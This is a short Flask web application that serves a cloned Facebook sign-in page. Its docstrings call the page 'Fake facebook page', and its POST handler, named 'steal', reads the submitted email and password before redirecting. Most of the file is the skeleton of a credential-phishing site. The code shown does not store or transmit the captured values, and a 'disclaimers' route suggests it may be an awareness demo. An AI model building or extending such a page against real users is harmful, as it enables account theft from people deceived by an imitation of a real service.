"""Our script for dynamic page serving."""

from flask import Flask, render_template, request, redirect
import requests


app = Flask(__name__)


@app.route("/")
@app.route("/index")
def index():
    """Index page."""
    return render_template("index.html")


@app.route("/portals")
def portals():
    """Portal."""
    return render_template("portals.html")


@app.route("/disclaimers")
def disclaimers():
    """Sign-in disclaimer."""
    return render_template("disclaimers.html")


@app.route("/signin")
def signin():
    """Fake facebook page."""
    return render_template("facebookClone.htm")

@app.route("/signin", methods=["POST"])
def steal():
    """Fake facebook page."""
    email = request.form["email"]
    password = request.form["pass"]

    return redirect("facebookClone.htm")
